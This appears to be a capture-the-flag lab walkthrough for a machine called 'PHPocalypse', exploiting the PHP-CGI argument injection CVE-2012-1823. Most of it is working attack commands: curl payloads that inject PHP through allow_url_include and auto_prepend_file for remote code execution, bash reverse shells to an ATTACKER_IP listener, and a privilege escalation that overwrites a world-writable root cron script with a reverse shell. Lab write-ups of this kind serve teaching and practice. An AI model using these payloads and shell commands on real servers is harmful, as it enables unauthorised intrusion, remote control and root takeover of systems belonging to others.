# Machine 06: PHPocalypse — CVE-2012-1823 Walkthrough

## Overview
- **CVE**: CVE-2012-1823 (CVSS 9.8)
- **Vulnerability**: PHP-CGI argument injection — query string is passed as CLI args to php-cgi
- **Kill Chain**: `nmap` → PHP/CGI on port 80 → `?-s` leaks source → argument injection RCE → www-data shell → writable cron script → root shell

---

## Step 1: Reconnaissance

```bash
nmap -sC -sV -p- 10.10.6.10
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 8.x
# 80/tcp open  http    Apache httpd 2.4.x

# Identify PHP-CGI
curl -v http://10.10.6.10/ 2>&1 | grep -i php
# X-Powered-By: PHP/5.6.x
```

## Step 2: Enumeration — Confirm PHP-CGI

```bash
# The ?-s flag makes php-cgi output the source code of the file
curl "http://10.10.6.10/index.php?-s"
# Returns PHP source code — confirms php-cgi exposure (CVE-2012-1823)
```

## Step 3: Exploitation — RCE via argument injection

```bash
# Set up listener
nc -nlvp 4444

# Inject PHP code via php://input, enable allow_url_include via -d flag
curl -s "http://10.10.6.10/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  --data '<?php system("id"); ?>' \
  -H "Content-Type: application/x-www-form-urlencoded"
# Output: uid=33(www-data) gid=33(www-data)

# Reverse shell
curl -s "http://10.10.6.10/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input" \
  --data "<?php system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'); ?>" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Shell obtained as www-data. Read user flag:**
```bash
cat /home/user/user.txt
# FLAG{...}
```

## Step 4: Privilege Escalation — Writable cron script

```bash
# Discover the writable cron script
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root ... /opt/scripts/backup.sh

cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# Write reverse shell to the cron script
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /opt/scripts/backup.sh

# Wait up to 60 seconds for cron to execute
# On attacker: nc -nlvp 5555
```

**Root shell obtained:**
```bash
id    # uid=0(root)
cat /root/root.txt
# FLAG{...}
```

## Alternative Privesc — SUID vuln-reader

```bash
ls -la /usr/local/bin/vuln-reader
# -rwsr-xr-x  (SUID set)

/usr/local/bin/vuln-reader /root/root.txt
# FLAG{...}
```
